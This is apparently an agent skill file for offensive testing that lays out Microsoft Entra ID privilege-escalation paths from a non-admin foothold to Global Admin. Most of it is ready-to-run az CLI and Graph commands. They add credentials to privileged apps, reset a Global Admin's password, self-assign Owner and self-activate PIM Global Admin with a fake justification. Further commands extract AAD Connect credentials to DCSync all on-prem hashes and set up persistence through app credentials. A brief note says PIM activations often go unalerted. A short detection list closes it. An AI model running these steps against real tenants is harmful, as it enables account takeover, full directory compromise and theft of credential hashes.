---
name: offensive-entra-privesc
description: "Microsoft Entra ID privilege escalation paths — Application Administrator / Cloud Application Administrator role abuse, Privileged Authentication Administrator MFA reset, custom role with */write on RBAC, App Registration owner adding credentials, group-based role assignment, and PIM activation patterns. Use when you have a non-admin Entra foothold and need to reach Global Admin or comparable."
---

# Entra ID Privilege Escalation

## Common Paths

| Source Role | Target | Mechanism |
|---|---|---|
| Application Administrator | Any GA-assigned app | Add credentials to app, sign in as it |
| Cloud Application Administrator | Same minus on-prem | Same |
| Privileged Authentication Administrator | Reset MFA / pwd of GA | Take over GA account |
| Helpdesk / Authentication Administrator | Non-admin users only | Limited; check victim's roles |
| User Administrator | Create/modify users | Limited unless they reset GA pwd (which they can't) |
| Directory Synchronization Account | DCSync on-prem | Hybrid pivot |
| Custom role with `*/write` on RBAC | Edit role assignments | Self-elevate to GA |
| App Registration owner (on app with privileged role) | Add credential, mint app token | App's permissions |

## Application Admin → App → GA

```bash
# Find apps with Global Admin permissions
roadrecon gui → ApplicationPermissions → filter on Directory.ReadWrite.All / RoleManagement.ReadWrite.Directory

# Add credential to such an app (you're its admin)
az ad app credential reset --id <app-id> --append

# Auth as the app
az login --service-principal -u <app-id> -p <new-secret> --tenant <tenant-id>

# Now act with app's permissions
az rest --method POST --uri 'https://graph.microsoft.com/v1.0/users' --body '{...}'
```

## Privileged Authentication Administrator → GA Reset

```bash
# Reset password of a Global Admin
az ad user update --id ga@tenant.onmicrosoft.com --password 'NewPass123!' --force-change-password-next-login false
# Then sign in as them
```

This is one of the most direct paths — and PriviledgedAuthAdmin is sometimes mis-assigned.

## App Reg Owner Path

```bash
# You own an app
az ad app credential reset --id <app-id> --append --years 2

# App has any role assignment? → Run as app
# App has owner of group containing GA? → Add yourself to group
```

## Custom Role Self-Edit

```bash
# Custom role granted you Microsoft.Authorization/*/write
az role assignment create --assignee <self> --role "Owner" --scope /subscriptions/<sub>
```

## PIM Activation

```bash
# Eligible roles → activate without further approval
az rest --method POST \
  --uri 'https://graph.microsoft.com/beta/roleManagement/directory/roleAssignmentScheduleRequests' \
  --body '{
    "action": "selfActivate",
    "principalId": "<your-id>",
    "roleDefinitionId": "<global-admin-role-id>",
    "directoryScopeId": "/",
    "justification": "Daily admin"
  }'
```

If you're eligible-GA, activation gives you GA. Detection on PIM activation is logged but often not alerted.

## Hybrid AD Connect Server

If you compromise an AAD Connect server, the MSOL_* account in on-prem AD has DCSync rights:

```bash
# Extract from AAD Connect server
Get-AADIntADSyncCredentials   # AADInternals
# Or directly query the AdSync DB
sqlcmd -S server\ADSYNC -d ADSync -Q "SELECT ..."
```

Then DCSync on-prem AD with the MSOL_ account → all on-prem hashes.

## Engagement Cheatsheet

```bash
# 1. Map roles you / your apps have
roadrecon gather + gui → DirectoryRoles
az rest --method GET --uri "https://graph.microsoft.com/v1.0/me/memberOf"

# 2. Identify direct paths from current → GA via known privesc map

# 3. Test each path; document success/failure
# 4. Persist via app credential addition once GA reached
```

## Detection

- AAD Audit Log: role assignment changes, app credential additions, PIM activations
- Sign-in logs for service principals (anomalous IP / time)

Mature Identity Protection flags many of these; specific patterns evolve.

## Key References

- "Abusing Azure AD" research (Dirk-jan Mollema)
- ROADtools / AADInternals
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/entra-privesc.md
